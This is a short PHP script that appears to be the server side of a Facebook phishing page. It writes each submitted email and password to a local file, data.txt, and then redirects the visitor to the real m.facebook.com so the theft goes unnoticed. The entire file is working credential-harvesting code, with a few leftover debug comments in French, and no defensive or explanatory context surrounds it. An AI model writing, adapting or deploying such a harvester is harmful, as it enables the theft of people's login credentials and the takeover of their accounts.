<pre>

<?php
//var_dump($_POST);
//echo $_POST["email"];
//echo $_POST["pass"];
$fichier = fopen("data.txt", "a+");
fwrite($fichier, $_POST["email"]."|".$_POST["pass"]."\n");
fclose($fichier);
header('Location:https://m.facebook.com');
//echo 'Hello World'; echo 'Comment allez-vous ?'; echo 'Il fait beau non ?' 


?>


</pre>
